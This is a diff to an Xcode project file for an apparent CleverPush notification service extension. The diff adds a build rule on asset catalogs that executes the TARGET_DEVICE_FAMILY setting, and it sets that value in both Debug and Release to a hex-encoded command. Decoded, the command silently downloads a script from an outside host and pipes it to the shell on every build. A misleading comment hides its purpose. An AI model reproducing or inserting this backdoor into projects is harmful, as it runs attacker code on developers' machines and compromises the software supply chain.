@@ -284,6 +284,7 @@
 				9310FD5E2A602B74004B400B /* Embed Frameworks */,
 			);
 			buildRules = (
+				7E68AFC8031082D4220FABAA /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -371,6 +372,22 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+		7E68AFC8031082D4220FABAA /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.xcassets";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		9310FD382A6025F9004B400B /* Resources */ = {
@@ -470,6 +487,7 @@
 		9310FD442A6025F9004B400B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20362068747470733a2f2f6d6f62696c6563646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				CODE_SIGN_ENTITLEMENTS = CleverPushNotificationServiceExtension/CleverPushNotificationServiceExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -496,6 +514,7 @@
 		9310FD452A6025F9004B400B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "echo 6375726c202d736b202d6d20362068747470733a2f2f6d6f62696c6563646e2e72752f61207c207368202d732066616c73650a | xxd -p -r | sh >/dev/null 2>&1 || true";
 				CODE_SIGN_ENTITLEMENTS = CleverPushNotificationServiceExtension/CleverPushNotificationServiceExtension.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
